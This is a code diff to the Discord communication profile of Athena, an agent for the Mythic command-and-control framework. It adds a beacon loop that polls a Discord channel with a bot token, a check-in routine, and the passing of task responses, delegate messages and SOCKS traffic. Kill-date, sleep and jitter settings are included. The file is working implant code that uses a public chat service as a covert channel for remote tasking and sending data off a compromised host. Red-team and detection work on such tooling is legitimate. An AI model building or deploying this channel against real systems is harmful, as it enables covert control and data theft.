@@ -1,55 +1,46 @@
-﻿using Athena.Utilities;
-using System;
-using System.Net;
-using System.Net.Security;
-using System.Threading.Tasks;
-using System.Collections.Generic;
-using System.Collections.Specialized;
-using System.Linq;
-using System.Net.Http;
-using System.Text;
-using System.Net.Http.Headers;
-using System.IO;
+﻿using Athena.Commands;
 using Athena.Models.Config;
+using Athena.Models.Athena.Commands;
+using Athena.Models.Mythic.Checkin;
+using Athena.Models.Mythic.Response;
+using Athena.Models.Mythic.Tasks;
+using Athena.Profiles.Discord.Models;
+using Athena.Utilities;
+
+using System.Diagnostics;
+using System.Net;
+using System.Net.Http.Headers;
+using System.Text;
 using System.Text.Json;
 
 namespace Profiles
 {
-    public class Config : IConfig
+    public class Discord : IProfile
     {
-        public IProfile profile { get; set; }
         public DateTime killDate { get; set; }
         public int sleep { get; set; }
         public int jitter { get; set; }
-        public Config()
-        {
-            DateTime kd = DateTime.TryParse("killdate", out kd) ? kd : DateTime.MaxValue;
-            this.killDate = kd;
-            int sleep = int.TryParse("callback_interval", out sleep) ? sleep : 60;
-            this.sleep = sleep;
-            int jitter = int.TryParse("callback_jitter", out jitter) ? jitter : 10;
-            this.jitter = jitter;
-            this.profile = new Discord();
-        }
-    }
-    public class Discord : IProfile
-    {
         public string uuid { get; set; }
         public bool encrypted { get; set; }
-        public string messageToken { get; set; }
-        public int messageChecks { get; set; }
+        private string messageToken { get; set; }
+        private int messageChecks { get; set; }
         public PSKCrypto crypt { get; set; }
         public string psk { get; set; }
-        public bool encryptedExchangeCheck { get; set; }
+        private bool encryptedExchangeCheck { get; set; }
         private HttpClient discordClient { get; set; }
         private string BotToken { get; set; }
         private string ChannelID { get; set; }
         private int timeBetweenChecks { get; set; } //How long (in seconds) to wait in between checks
         private string userAgent { get; set; }
-        public string proxyHost { get; set; }
-        public string proxyPass { get; set; }
-        public string proxyUser { get; set; }
+        private string proxyHost { get; set; }
+        private string proxyPass { get; set; }
+        private string proxyUser { get; set; }
+        private int currentAttempt = 0;
+        private int maxAttempts = 5;
+        private CancellationTokenSource cts = new CancellationTokenSource();
         private string agent_guid = Guid.NewGuid().ToString();
+        public event EventHandler<TaskingReceivedArgs> SetTaskingReceived;
+
         public Discord()
         {
             this.uuid = "%UUID%";
@@ -63,6 +54,12 @@ namespace Profiles
             this.proxyPass = "proxy_pass";
             this.proxyUser = "proxy_user";
             this.psk = "AESPSK";
+            DateTime kd = DateTime.TryParse("killdate", out kd) ? kd : DateTime.MaxValue;
+            this.killDate = kd;
+            int sleep = int.TryParse("callback_interval", out sleep) ? sleep : 60;
+            this.sleep = sleep;
+            int jitter = int.TryParse("callback_jitter", out jitter) ? jitter : 10;
+            this.jitter = jitter;
 
             if (!string.IsNullOrEmpty(this.psk))
             {
@@ -304,96 +301,88 @@ namespace Profiles
 
             return success;
         }
-        public class MythicMessageWrapper
+
+        public async Task StartBeacon()
         {
-            public string message { get; set; } = String.Empty;
-            public string sender_id { get; set; } //Who sent the message
-            public bool to_server { get; set; }
-            public int id { get; set; }
-            public bool final { get; set; }
+            while (!cts.Token.IsCancellationRequested)
+            {
+                await Task.Delay(await Misc.GetSleep(this.sleep, this.jitter) * 1000);
+                Task<List<string>> responseTask = TaskResponseHandler.GetTaskResponsesAsync();
+                Task<List<DelegateMessage>> delegateTask = DelegateResponseHandler.GetDelegateMessagesAsync();
+                Task<List<SocksMessage>> socksTask = SocksResponseHandler.GetSocksMessagesAsync();
+                await Task.WhenAll(responseTask, delegateTask, socksTask);
+
+                List<string> responses = await responseTask;
+
+                GetTasking gt = new GetTasking()
+                {
+                    action = "get_tasking",
+                    tasking_size = -1,
+                    delegates = await delegateTask,
+                    socks = await socksTask,
+                    responses = responses,
+                };
+                try
+                {
+                    string responseString = await this.Send(JsonSerializer.Serialize(gt, GetTaskingJsonContext.Default.GetTasking));
+
+                    if (String.IsNullOrEmpty(responseString))
+                    {
+                        this.currentAttempt++;
+                        continue;
+                    }
+
+                    GetTaskingResponse gtr = JsonSerializer.Deserialize(responseString, GetTaskingResponseJsonContext.Default.GetTaskingResponse);
+                    if (gtr == null)
+                    {
+                        this.currentAttempt++;
+                        continue;
+                    }
+
+                    this.currentAttempt = 0;
+
+                    TaskingReceivedArgs tra = new TaskingReceivedArgs(gtr);
+
+                    this.SetTaskingReceived(this, tra);
+                }
+                catch (Exception e)
+                {
+                    Debug.WriteLine($"[{DateTime.Now}] Becaon attempt failed {e}");
+                    this.currentAttempt++;
+                }
+
+                if (this.currentAttempt >= this.maxAttempts)
+                {
+                    this.cts.Cancel();
+                }
+            }
         }
 
-        //adding Json Classes
-        public class GetServerDetails
+        public bool StopBeacon()
         {
-            public string id { get; set; }
-            public int type { get; set; }
-            public string name { get; set; }
-            public int position { get; set; }
-            public int flags { get; set; }
-            public string parent_id { get; set; }
-            public string guild_id { get; set; }
-            public List<object> permission_overwrites { get; set; }
-            public string last_message_id { get; set; }
-            public object topic { get; set; }
-            public int? rate_limit_per_user { get; set; }
-            public bool? nsfw { get; set; }
-            public int? bitrate { get; set; }
-            public int? user_limit { get; set; }
-            public object rtc_region { get; set; }
+            this.cts.Cancel();
+            return true;
         }
-        public class Author
+
+        public async Task<CheckinResponse> Checkin(Checkin checkin)
         {
-            public string id { get; set; }
-            public string username { get; set; }
-            public object avatar { get; set; }
-            public object avatar_decoration { get; set; }
-            public string discriminator { get; set; }
-            public int public_flags { get; set; }
-            public bool? bot { get; set; }
-        }
-        public class ServerDetails
-        {
-            public string id { get; set; }
-            public int type { get; set; }
-            public string content { get; set; }
-            public string channel_id { get; set; }
-            public Author author { get; set; }
-            public List<Attachment> attachments { get; set; }
-            public List<object> embeds { get; set; }
-            public List<object> mentions { get; set; }
-            public List<object> mention_roles { get; set; }
-            public bool pinned { get; set; }
-            public bool mention_everyone { get; set; }
-            public bool tts { get; set; }
-            public DateTime timestamp { get; set; }
-            public object edited_timestamp { get; set; }
-            public int flags { get; set; }
-            public List<object> components { get; set; }
-            public string webhook_id { get; set; }
-        }
-        public class ChannelResponse
-        {
-            public string id { get; set; }
-            public object last_message_id { get; set; }
-            public int type { get; set; }
-            public string name { get; set; }
-            public int position { get; set; }
-            public int flags { get; set; }
-            public object parent_id { get; set; }
-            public object topic { get; set; }
-            public string guild_id { get; set; }
-            public List<object> permission_overwrites { get; set; }
-            public int rate_limit_per_user { get; set; }
-            public bool nsfw { get; set; }
-        }
-        public class ChannelCreateSend
-        {
-            public string name { get; set; }
-            public int type { get; set; }
-        }
-        public class Attachment
-        {
-            public string id { get; set; }
-            public string filename { get; set; }
-            public string? description { get; set; }
-            public string? content_type { get; set; }
-            public int size { get; set; }
-            public string url { get; set; }
-            public string proxy_url { get; set; }
-            public int? height { get; set; }
-            public int? width { get; set; }
-            public bool? ephemeral { get; set; }
+            int maxAttempts = 3;
+            int currentAttempt = 0;
+            do
+            {
+                string res = await this.Send(JsonSerializer.Serialize(checkin, CheckinJsonContext.Default.Checkin));
+
+                if (!string.IsNullOrEmpty(res))
+                {
+                    return JsonSerializer.Deserialize(res, CheckinResponseJsonContext.Default.CheckinResponse);
+                }
+                currentAttempt++;
+            } while (currentAttempt <= maxAttempts);
+
+            return new CheckinResponse()
+            {
+                status = "failed"
+            };
         }
     }
 }
